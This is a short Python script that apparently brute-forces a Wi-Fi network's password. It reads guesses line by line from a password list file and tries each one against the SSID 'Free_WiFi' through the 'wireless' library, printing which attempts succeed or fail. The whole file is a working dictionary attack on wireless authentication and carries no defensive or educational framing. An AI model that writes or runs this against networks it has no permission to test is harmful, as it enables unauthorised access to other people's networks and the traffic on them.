from wireless import Wireless

wire = Wireless()

with open('passwordlist.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='Free_WiFi', password=line.strip()) == True:
            print('[+]' + line.strip() + ' - Success!')
        else:
            print('[-] ' + line.strip() + ' - Failed!')

